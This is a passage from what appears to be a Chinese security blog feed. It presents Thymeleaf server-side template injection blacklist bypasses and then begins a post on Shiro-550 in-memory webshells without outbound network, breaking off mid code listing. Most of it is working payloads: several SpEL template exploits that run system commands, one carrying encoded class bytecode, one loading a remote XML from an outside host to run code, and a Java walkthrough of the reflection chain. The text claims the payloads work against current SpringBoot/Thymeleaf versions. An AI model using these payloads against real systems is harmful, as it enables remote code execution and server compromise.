<code>Thymeleaf</code> 是检测不出来的。</li></ol><p>下面的 <code>poc</code> 用的是第二种思路，主要是发现了 <code>org.springframework.util.ReflectionUtils</code> 封装了反射调用的方法， <code>org.springframework.cglib.core.ReflectionUtils</code> 封装了通过字符串的类名来获取对应类的 <code>Class</code> 对象的功能，。并且 <code>POC1</code> 利用了 <code>org.springframework.cglib.core.ReflectionUtils#defineClass()</code> 可以通过字节码实例化类对象，类似于 <code>TemplatesImpl</code> 。</p><h3 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a>POC</h3><p><code>POC</code> 参考 <a href="https://github.com/p1n93r/SpringBootAdmin-thymeleaf-SSTI">https://github.com/p1n93r/SpringBootAdmin-thymeleaf-SSTI</a></p><h4 id="POC1"><a href="#POC1" class="headerlink" title="POC1"></a>POC1</h4><p>适用于 <code>jdk9</code> 之前。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span></span></span><br><span class="line"><span class="tag">        <span class="attr">th:with</span>=<span class="string">&quot;defineClassMethod=$&#123;T(org.springframework.util.ReflectionUtils).findMethod(T(org.springframework.util.ClassUtils).forName(&#x27;org.springframework.cglib.core.ReflectUtils&#x27;,T(org.springframework.util.ClassUtils).getDefaultClassLoader()), &#x27;defineClass&#x27;, &#x27;&#x27;.getClass() ,&#x27;&#x27;.getBytes().getClass(), T(org.springframework.util.ClassUtils).forName(&#x27;java.lang.ClassLoader&#x27;,T(org.springframework.util.ClassUtils).getDefaultClassLoader()) )&#125;&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span></span></span><br><span class="line"><span class="tag">                <span class="attr">th:with</span>=<span class="string">&quot;param2=$&#123;T(org.springframework.util.ReflectionUtils).invokeMethod(defineClassMethod, null,</span></span></span><br><span class="line"><span class="string"><span class="tag">                    &#x27;fun.pinger.Hack&#x27;,</span></span></span><br><span class="line"><span class="string"><span class="tag">                    T(org.springframework.util.Base64Utils).decodeFromString(&#x27;yv66vgAAADQAKgoACQAYCgAZABoIABsKABkAHAcAHQcAHgoABgAfBwAoBwAhAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMSGFjazsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwAdAQAKU291cmNlRmlsZQEACUhhY2suamF2YQwACgALBwAiDAAjACQBAARjYWxjDAAlACYBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAAoAJwEABEhhY2sBABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgEAD2Z1bi9waW5nZXIvSGFjawEAEUxmdW4vcGluZ2VyL0hhY2s7ACEACAAJAAAAAAACAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAAwAOAAAADAABAAAABQAPACkAAAAIABEACwABAAwAAABmAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAwANAAAAFgAFAAAABwAJAAoADAAIAA0ACQAWAAsADgAAAAwAAQANAAkAEgATAAAAFAAAAAcAAkwHABUJAAEAFgAAAAIAFw==&#x27;),</span></span></span><br><span class="line"><span class="string"><span class="tag">                    new org.springframework.core.OverridingClassLoader(T(org.springframework.util.ClassUtils).getDefaultClassLoader()) )</span></span></span><br><span class="line"><span class="string"><span class="tag">                &#125;&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">th:href</span>=<span class="string">&quot;$&#123;param2&#125;&quot;</span></span></span><br><span class="line"><span class="tag">        &gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="POC2"><a href="#POC2" class="headerlink" title="POC2"></a>POC2</h4><p>适用于 <code>jdk9</code> 之后。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span></span></span><br><span class="line"><span class="tag">        <span class="attr">th:with</span>=<span class="string">&quot;createMethod=$&#123;T(org.springframework.util.ReflectionUtils).findMethod(T(org.springframework.util.ClassUtils).forName(&#x27;jdk.jshell.JShell&#x27;,T(org.springframework.util.ClassUtils).getDefaultClassLoader()), &#x27;create&#x27; )&#125;&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span></span></span><br><span class="line"><span class="tag">            <span class="attr">th:with</span>=<span class="string">&quot;shellObj=$&#123;T(org.springframework.util.ReflectionUtils).invokeMethod(createMethod, null)&#125;&quot;</span></span></span><br><span class="line"><span class="tag">    &gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span></span></span><br><span class="line"><span class="tag">              <span class="attr">th:with</span>=<span class="string">&quot;evalMethod=$&#123;T(org.springframework.util.ReflectionUtils).findMethod(T(org.springframework.util.ClassUtils).forName(&#x27;jdk.jshell.JShell&#x27;,T(org.springframework.util.ClassUtils).getDefaultClassLoader()), &#x27;eval&#x27;, &#x27;&#x27;.getClass() )&#125;&quot;</span></span></span><br><span class="line"><span class="tag">      &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span></span></span><br><span class="line"><span class="tag">                <span class="attr">th:with</span>=<span class="string">&quot;param2=$&#123;T(org.springframework.util.ReflectionUtils).invokeMethod(evalMethod, shellObj,  new java.lang.String(T(org.springframework.util.Base64Utils).decodeFromString(&#x27;amF2YS5sYW5nLlJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoImNhbGMiKQ==&#x27;)))</span></span></span><br><span class="line"><span class="string"><span class="tag">                &#125;&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">th:href</span>=<span class="string">&quot;$&#123;param2&#125;&quot;</span></span></span><br><span class="line"><span class="tag">        &gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="POC3"><a href="#POC3" class="headerlink" title="POC3"></a>POC3</h4><p>不限 <code>jdk</code> 版本。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span></span></span><br><span class="line"><span class="tag">        <span class="attr">th:with</span>=<span class="string">&quot;getRuntimeMethod=$&#123;T(org.springframework.util.ReflectionUtils).findMethod(T(org.springframework.util.ClassUtils).forName(&#x27;java.lang.Runtime&#x27;,T(org.springframework.util.ClassUtils).getDefaultClassLoader()), &#x27;getRuntime&#x27; )&#125;&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span></span></span><br><span class="line"><span class="tag">            <span class="attr">th:with</span>=<span class="string">&quot;runtimeObj=$&#123;T(org.springframework.util.ReflectionUtils).invokeMethod(getRuntimeMethod, null)&#125;&quot;</span></span></span><br><span class="line"><span class="tag">    &gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span></span></span><br><span class="line"><span class="tag">              <span class="attr">th:with</span>=<span class="string">&quot;exeMethod=$&#123;T(org.springframework.util.ReflectionUtils).findMethod(T(org.springframework.util.ClassUtils).forName(&#x27;java.lang.Runtime&#x27;,T(org.springframework.util.ClassUtils).getDefaultClassLoader()), &#x27;exec&#x27;, &#x27;&#x27;.getClass() )&#125;&quot;</span></span></span><br><span class="line"><span class="tag">      &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span></span></span><br><span class="line"><span class="tag">                <span class="attr">th:with</span>=<span class="string">&quot;param2=$&#123;T(org.springframework.util.ReflectionUtils).invokeMethod(exeMethod, runtimeObj, &#x27;calc&#x27; )</span></span></span><br><span class="line"><span class="string"><span class="tag">                &#125;&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">th:href</span>=<span class="string">&quot;$&#123;param2&#125;&quot;</span></span></span><br><span class="line"><span class="tag">        &gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="3-1-2版本利用"><a href="#3-1-2版本利用" class="headerlink" title="3.1.2版本利用"></a>3.1.2版本利用</h2><p>高版本 <code>3.1.2</code> 进一步加入了 <code>8</code> 个新的类到黑名单来处理 <code>3.1.1</code> 版本的 <code>CVE-2023-38286</code> 。</p><p><img src="/imgs/Pasted%20image%2020240320165648.png"></p><p><img src="/imgs/Pasted%20image%2020240320035906.png"></p><blockquote><p>目前 <code>SpringBoot</code> 最高的版本为 <code>3.2.3</code> ，对应的 <code>Thymeleaf</code> 版本为 <code>3.1.2</code> 。也就是说下面的 <code>poc</code> 可以通杀当前 <code>SpringBoot</code> 对应的 <code>Thymeleaf</code> 。</p></blockquote><p><img src="/imgs/Pasted%20image%2020240320033805.png"></p><h3 id="POC-5"><a href="#POC-5" class="headerlink" title="POC"></a>POC</h3><p>绕过 <code>poc</code> 如下（其中 <code>..</code> 的部分也可以用一个 <code>.</code> ，只不过 <code>..</code> 可能可以过一些 <code>WAF</code> ）：</p><h4 id="POC1-1"><a href="#POC1-1" class="headerlink" title="POC1"></a>POC1</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&#x27;$&#123;__$&#123;new.org..apache.tomcat.util.IntrospectionUtils().getClass().callMethodN(new.org..apache.tomcat.util.IntrospectionUtils().getClass().callMethodN(new.org..apache.tomcat.util.IntrospectionUtils().getClass().findMethod(new.org..springframework.instrument.classloading.ShadowingClassLoader(new.org..apache.tomcat.util.IntrospectionUtils().getClass().getClassLoader()).loadClass(&quot;java.lang.Runtime&quot;),&quot;getRuntime&quot;,null),&quot;invoke&quot;,&#123;null,null&#125;,&#123;new.org..springframework.instrument.classloading.ShadowingClassLoader(new.org..apache.tomcat.util.IntrospectionUtils().getClass().getClassLoader()).loadClass(&quot;java.lang.Object&quot;),new.org..springframework.instrument.classloading.ShadowingClassLoader(new.org..apache.tomcat.util.IntrospectionUtils().getClass().getClassLoader()).loadClass(&quot;org.&quot;+&quot;thymeleaf.util.ClassLoaderUtils&quot;).loadClass(&quot;[Ljava.lang.Object;&quot;)&#125;),&quot;exec&quot;,&quot;calc&quot;,new.org..springframework.instrument.classloading.ShadowingClassLoader(new.org..apache.tomcat.util.IntrospectionUtils().getClass().getClassLoader()).loadClass(&quot;java.lang.String&quot;))&#125;__&#125;&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面的 <code>spel</code> 表达式的 <code>poc</code> 等效于下面的 <code>java</code> 代码，用来说明原理：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.just;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.IntrospectionUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.instrument.classloading.ShadowingClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method; <span class="comment">// 这个import可以省略，我这里只是中间过程写的比较详细</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">不import黑名单的类来实现RCE，完全只靠IntrospectionUtils和ShadowingClassLoader。黑名单的类通过字面量反射来获取，这样Thymeleaf就识别不出来。</span></span><br><span class="line"><span class="comment">ShadowingClassLoader提供根据类名来获取对应的Class对象的功能，类似前面的org.springframework.util.ReflectionUtils。</span></span><br><span class="line"><span class="comment">IntrospectionUtils提供获取和调用某个类的方法的功能，类似前面org.springframework.cglib.core.ReflectionUtils。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ShadowingClassLoader</span> <span class="variable">shadowingClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShadowingClassLoader</span>(IntrospectionUtils.class.getClassLoader());</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; objectClass = shadowingClassLoader.loadClass(<span class="string">&quot;java.lang.Object&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; stringClass = shadowingClassLoader.loadClass(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; classLoaderUtilsClass = shadowingClassLoader.loadClass(<span class="string">&quot;org.thymeleaf.util.ClassLoaderUtils&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> IntrospectionUtils.findMethod(shadowingClassLoader.loadClass(<span class="string">&quot;java.lang.Runtime&quot;</span>), <span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">loadClassMethod</span> <span class="operator">=</span> IntrospectionUtils.findMethod(shadowingClassLoader.loadClass(<span class="string">&quot;org.thymeleaf.util.ClassLoaderUtils&quot;</span>), <span class="string">&quot;loadClass&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;stringClass&#125;);</span><br><span class="line">        <span class="comment">// 这里获取Class的方式比较特殊是因为shadowingClassLoader无法通过字符串加载数组类型的Class，也就是无法识别[Lxxx;的类名</span></span><br><span class="line">        Class&lt;?&gt; objectArrayClass = (Class&lt;?&gt;) loadClassMethod.invoke(classLoaderUtilsClass, <span class="string">&quot;[Ljava.lang.Object;&quot;</span>);</span><br><span class="line">        <span class="comment">// 通过反射获取Runtime对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">runtimeObject</span> <span class="operator">=</span> IntrospectionUtils.callMethodN(getRuntimeMethod, <span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;objectClass, objectArrayClass&#125;);</span><br><span class="line">        <span class="comment">// 通过反射调用Runtime对象的exec方法</span></span><br><span class="line">        IntrospectionUtils.callMethodN(runtimeObject, <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;stringClass&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="POC2-1"><a href="#POC2-1" class="headerlink" title="POC2"></a>POC2</h4><p>这个 <code>POC</code> 利用常见的 <code>ClassPathXmlApplicationContext</code> 类来 <code>RCE</code> ，但是需要出网：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&#x27;$&#123;__$&#123;T(org. apache.el.util.ReflectionUtil).forName(\&quot;com.zaxxer.hikari.util.UtilityElf\&quot;).createInstance(\&quot;org.\&quot;+\&quot;springframework.context.support.ClassPathXmlApplicationContext\&quot;, T(org. apache.el.util.ReflectionUtil).forName(\&quot;org.\&quot;+\&quot;springframework.context.support.ClassPathXmlApplicationContext\&quot;), \&quot;http://ip/test.xml\&quot;)&#125;__&#125;&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="POC3-1"><a href="#POC3-1" class="headerlink" title="POC3"></a>POC3</h4><p>这里利用 <code>jshell</code> 来命令执行。这里的 <code>UtilityElf</code> 是 <code>SpringBoot-JDBC</code> 依赖中的类。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&#x27;$&#123;__$&#123;T(org. apache.tomcat.util.IntrospectionUtils).callMethodN(T(com.zaxxer.hikari.util.UtilityElf).createInstance(&#x27;</span><span class="attr">jakarta.el.ELProcessor</span>&#x27;, <span class="attr">T</span>(<span class="attr">ch.qos.logback.core.util.Loader</span>)<span class="attr">.loadClass</span>(&#x27;<span class="attr">jakarta.el.ELProcessor</span>&#x27;)), &#x27;<span class="attr">eval</span>&#x27;, <span class="attr">new</span> <span class="attr">java.lang.String</span>[]&#123;&#x27;\&quot;\&quot;<span class="attr">.getClass</span>()<span class="attr">.forName</span>(\&quot;<span class="attr">jdk.jshell.JShell</span>\&quot;)<span class="attr">.getMethods</span>()[<span class="attr">6</span>]<span class="attr">.invoke</span>(\&quot;\&quot;<span class="attr">.getClass</span>()<span class="attr">.forName</span>(\&quot;<span class="attr">jdk.jshell.JShell</span>\&quot;))<span class="attr">.eval</span>(\&quot;<span class="attr">java.lang.Runtime.getRuntime</span>()<span class="attr">.exec</span>(\\\&quot;<span class="attr">calc</span>\\\&quot;)\&quot;)&#x27;&#125;, <span class="attr">T</span>(<span class="attr">org.</span> <span class="attr">apache.el.util.ReflectionUtil</span>)<span class="attr">.toTypeArray</span>(<span class="attr">new</span> <span class="attr">java.lang.String</span>[]&#123;\&quot;<span class="attr">java.lang.String</span>\&quot;&#125;))&#125;<span class="attr">__</span>&#125;&#x27;&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.0kami.cn/blog/2024/thymeleaf%20ssti%203.1.2%20%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/">https://blog.0kami.cn/blog/2024/thymeleaf%20ssti%203.1.2%20%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/</a><br><a href="https://boogipop.com/2024/01/29/RealWorld%20CTF%206th%20%E6%AD%A3%E8%B5%9B_%E4%BD%93%E9%AA%8C%E8%B5%9B%20%E9%83%A8%E5%88%86%20Web%20Writeup/">https://boogipop.com/2024/01/29/RealWorld%20CTF%206th%20%E6%AD%A3%E8%B5%9B_%E4%BD%93%E9%AA%8C%E8%B5%9B%20%E9%83%A8%E5%88%86%20Web%20Writeup/</a><br><a href="https://blog.ruozhi.xyz/2024/01/28/chatter-box-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/#Step-3-%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%BB%95%E8%BF%87">https://blog.ruozhi.xyz/2024/01/28/chatter-box-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/#Step-3-%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%BB%95%E8%BF%87</a><br><a href="https://github.com/p1n93r/SpringBootAdmin-thymeleaf-SSTI">https://github.com/p1n93r/SpringBootAdmin-thymeleaf-SSTI</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> Thymeleaf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Thymeleaf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiro-550不出网回显技术</title>
      <link href="/2024/03/24/Shiro-550%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/"/>
      <url>/2024/03/24/Shiro-550%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>当我们实战遇到 <code>Shiro-550</code> 漏洞可以打反序列化的时候，如果目标靶机无法出网，我们怎么想办法回显命令执行的结果？ </p><p>这里最直接的思路是打内存马回显，但是由于 <code>Shiro-550</code> 反序列化的数据在 <code>Header</code> 的 <code>cookie</code> 中，如果直接打内存马会导致 <code>Payload</code> 的长度过长，从而可能超过中间件对 <code>Header</code> 的长度限制 <code>server.max-http-header-size</code> （ <code>Tomcat</code> 默认是 <code>8kb</code> ）。 </p><blockquote><p>环境： <code>jdk-8u333</code> ， <code>SpringBoot-2.7.18</code> ， <code>Shiro-1.2.4</code> 。</p></blockquote><p>我们直接打入下面的 <code>Filter</code> 内存马发现长度是 <code>9004</code> 刚好超了一点。</p><p><img src="/imgs/Pasted%20image%2020240323035003.png"></p><p>打入时会报错：</p><p><img src="/imgs/Pasted%20image%2020240323035152.png"></p><p>内存马代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span 